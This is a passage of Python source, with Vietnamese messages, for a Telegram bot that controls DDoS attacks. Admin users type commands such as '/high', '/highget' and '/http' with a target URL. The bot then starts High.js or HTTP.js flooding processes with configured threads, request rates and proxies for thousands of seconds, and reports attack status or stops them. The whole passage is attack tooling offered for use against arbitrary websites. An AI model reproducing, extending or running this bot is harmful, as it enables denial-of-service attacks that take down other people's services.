        command = message.text.split()[0]  # Lấy lệnh: /ddosstart, /high, /http
        
        parts = message.text.split(' ', 1)
        
        # Nếu chỉ có lệnh không có URL -> hiển thị hướng dẫn
        if len(parts) < 2:
            if command == "/ddosstart":
                help_text = f"""
🥀 *DDOS ATTACK - HƯỚNG DẪN*

*CẤU HÌNH HIỆN TẠI:*
• Threads: {THREADS}
• Requests: {REQUESTS}/giây

*CÁC LỆNH:*
• `/high <url>` - High.js attack (POST)
• `/highget <url>` - High.js attack (GET)
• `/http <url>` - HTTP.js attack
• `/stopattack` - Dừng attack
• `/status` - Kiểm tra trạng thái

*HIGH.JS THAM SỐ:*
• Time: 5000 giây
• Threads: {THREADS}
• Rate: {REQUESTS}/giây
• Thêm: ?q=%RAND% tự động

*HTTP.JS THAM SỐ:*
• Time: 50000 giây
• Threads: {THREADS}
• Rate: {REQUESTS}/giây

*VÍ DỤ:*
`/high https://example.com`
`/highget https://target.com`
`/http https://example.com`
                """
            elif command == "/high":
                help_text = f"🔧 *HIGH.JS ATTACK*\n\nCách dùng: `/high <url>`\nThreads: {THREADS}\nRate: {REQUESTS}/s\nVD: `/high https://example.com`"
            elif command == "/http":
                help_text = f"🌐 *HTTP.JS ATTACK*\n\nCách dùng: `/http <url>`\nThreads: {THREADS}\nRate: {REQUESTS}/s\nVD: `/http https://example.com`"
            else:
                help_text = "❓ Lệnh không hợp lệ"
            
            bot.reply_to(message, help_text, parse_mode='Markdown')
            return
        
        url = parts[1].strip()
        
        is_valid, error_msg = validate_url(url)
        if not is_valid:
            bot.reply_to(message, f"💢 {error_msg}")
            return
        
        global ATTACK_ACTIVE
        if ATTACK_ACTIVE:
            elapsed = get_elapsed_time()
            bot.reply_to(message, f"💦️ *Đang có attack chạy!*\n\n💤 Target: `{ATTACK_TARGET}`\n⏱️ Time: {elapsed}\n📡 Type: {ATTACK_TYPE}\n\nDùng `/stopattack` để dừng trước.", parse_mode='Markdown')
            return
        
        proxy_count = count_proxies()
        
        if command == "/high":
            # HIGH.JS POST
            msg = bot.reply_to(message, f"""
🔧 *ĐANG CHUẨN BỊ HIGH.JS (POST)...*

💤 *Target:* `{url}`
📡 *Method:* POST
⏱️ *Time:* 5000s
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây
💌 *Proxies:* {proxy_count}

💔 *Đang khởi động...*
            """, parse_mode='Markdown')
            
            ATTACK_ACTIVE = True
            success, error = run_high_attack(url, "POST")
            
            if success:
                elapsed = get_elapsed_time()
                bot.edit_message_text(f"""
✅ *HIGH.JS ATTACK ĐÃ KHỞI ĐỘNG!*

💤 *Target:* `{url}`
📡 *Method:* POST
⏱️ *Time:* {elapsed}
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây

💔 *Đang chạy - xem output trong console*
🛑 Dùng `/stopattack` để dừng
                """, message.chat.id, msg.message_id, parse_mode='Markdown')
            else:
                ATTACK_ACTIVE = False
                bot.edit_message_text(f"💢 *Khởi động thất bại!*\n\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown')
        
        elif command == "/http":
            # HTTP.JS
            msg = bot.reply_to(message, f"""
🌐 *ĐANG CHUẨN BỊ HTTP.JS ATTACK...*

💤 *Target:* `{url}`
⏱️ *Time:* 50000s
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây
💌 *Proxies:* {proxy_count}

💔 *Đang khởi động...*
            """, parse_mode='Markdown')
            
            ATTACK_ACTIVE = True
            success, error = run_http_attack(url)
            
            if success:
                elapsed = get_elapsed_time()
                bot.edit_message_text(f"""
✅ *HTTP.JS ATTACK ĐÃ KHỞI ĐỘNG!*

💤 *Target:* `{url}`
⏱️ *Time:* {elapsed}
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây

💔 *Đang chạy - xem output trong console*
🛑 Dùng `/stopattack` để dừng
                """, message.chat.id, msg.message_id, parse_mode='Markdown')
            else:
                ATTACK_ACTIVE = False
                bot.edit_message_text(f"💢 *Khởi động thất bại!*\n\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown')
    
    @bot.message_handler(commands=['highget'])
    def handle_highget(message):
        if not is_admin(message.chat.id):
            bot.reply_to(message, "⛔ ACCESS DENIED")
            return
        
        parts = message.text.split(' ', 1)
        
        if len(parts) < 2:
            bot.reply_to(message, f"💢 *Thiếu URL!*\nVD: `/highget https://example.com`\n\nThreads: {THREADS}\nRate: {REQUESTS}/s", parse_mode='Markdown')
            return
        
        url = parts[1].strip()
        
        is_valid, error_msg = validate_url(url)
        if not is_valid:
            bot.reply_to(message, f"💢 {error_msg}")
            return
        
        global ATTACK_ACTIVE
        if ATTACK_ACTIVE:
            elapsed = get_elapsed_time()
            bot.reply_to(message, f"💦️ *Đang có attack chạy!*\n\n💤 Target: `{ATTACK_TARGET}`\n⏱️ Time: {elapsed}\n📡 Type: {ATTACK_TYPE}\n\nDùng `/stopattack` để dừng trước.", parse_mode='Markdown')
            return
        
        proxy_count = count_proxies()
        msg = bot.reply_to(message, f"""
🔧 *ĐANG CHUẨN BỊ HIGH.JS (GET)...*

💤 *Target:* `{url}`
📡 *Method:* GET
⏱️ *Time:* 5000s
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây
💌 *Proxies:* {proxy_count}

💔 *Đang khởi động...*
        """, parse_mode='Markdown')
        
        ATTACK_ACTIVE = True
        success, error = run_high_attack(url, "GET")
        
        if success:
            elapsed = get_elapsed_time()
            bot.edit_message_text(f"""
✅ *HIGH.JS ATTACK (GET) ĐÃ KHỞI ĐỘNG!*

💤 *Target:* `{url}`
📡 *Method:* GET
⏱️ *Time:* {elapsed}
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây

💔 *Đang chạy - xem output trong console*
🛑 Dùng `/stopattack` để dừng
            """, message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            ATTACK_ACTIVE = False
            bot.edit_message_text(f"💢 *Khởi động thất bại!*\n\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown')
    
    @bot.message_handler(commands=['stopattack'])
    def handle_stopattack(message):
        if not is_admin(message.chat.id):
            bot.reply_to(message, "⛔ ACCESS DENIED")
            return
        
        global ATTACK_ACTIVE
        if not ATTACK_ACTIVE:
            bot.reply_to(message, "ℹ️ *Không có attack nào đang chạy*", parse_mode='Markdown')
            return
        
        msg = bot.reply_to(message, "🛑 *Đang dừng attack...*", parse_mode='Markdown')
        
        success, error = stop_attack()
        
        if success:
            elapsed = get_elapsed_time()
            bot.edit_message_text(f"""
✅ *ATTACK ĐÃ DỪNG!*

⏱️ *Thời gian:* {elapsed}
💤 *Target:* `{ATTACK_TARGET}`
📡 *Type:* {ATTACK_TYPE}
🔧 *Method:* {ATTACK_METHOD}

🔄 *Sẵn sàng cho attack mới*
            """, message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(f"💢 *Lỗi khi dừng:*\n{error}", message.chat.id, msg.message_id, parse_mode='Markdown')
    
    @bot.message_handler(commands=['status'])
    def handle_status(message):
        if not is_admin(message.chat.id):
            bot.reply_to(message, "⛔ ACCESS DENIED")
            return
        
        global ATTACK_ACTIVE, ATTACK_TARGET, ATTACK_METHOD, ATTACK_TYPE
        proxy_count = count_proxies()
        
        # Kiểm tra process
        actual_running = False
        if ATTACK_PROCESS:
            check_cmd = f"ps -p {ATTACK_PROCESS.pid} > /dev/null 2>&1 && echo 'running'"
            result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
            actual_running = result.stdout.strip() == "running"
        
        if ATTACK_ACTIVE and actual_running:
            elapsed = get_elapsed_time()
            
            if ATTACK_TYPE == "high":
                threads = str(THREADS)
                rate = f"{REQUESTS}/giây"
                time_param = "5000s"
            else:  # http
                threads = str(THREADS)
                rate = f"{REQUESTS}/giây"
                time_param = "50000s"
            
            status_text = f"""
💥 *TRẠNG THÁI {ATTACK_TYPE.upper()}.JS ATTACK*

💙 *Status:* ĐANG CHẠY ✅
💤 *Target:* `{ATTACK_TARGET}`
📡 *Method:* {ATTACK_METHOD}
⏱️ *Time:* {elapsed} / {time_param}
💫 *Threads:* {threads}
💔 *Rate:* {rate}
💌 *Proxies:* {proxy_count}

🛑 Dùng `/stopattack` để dừng
            """
        elif ATTACK_ACTIVE and not actual_running:
            ATTACK_ACTIVE = False
            status_text = f"""
💥 *TRẠNG THÁI ATTACK*

💙 *Status:* PROCESS ĐÃ CHẾT 💢
💦️ Attack đã tự động dừng

🥀 Dùng `/high <url>` hoặc `/http <url>` để bắt đầu mới
            """
        else:
            status_text = f"""
💥 *TRẠNG THÁI ATTACK*

💙 *Status:* ĐANG TẮT ✅
💌 *Proxies:* {proxy_count}
💫 *Threads:* {THREADS}
💔 *Rate:* {REQUESTS}/giây

🥀 *Bắt đầu:*
• `/high <url>` - High.js attack
• `/http <url>` - HTTP.js attack
            """
        
        bot.reply_to(message, status_text, parse_mode='Markdown')
except ImportError as e:
    print(f"\n[💢] IMPORT ERROR: {e}")
    import traceback
    traceback.print_exc()
except Exception as e:
    print(f"\n[💢] LOAD ERROR: {e}")
    import traceback
    traceback.print_exc()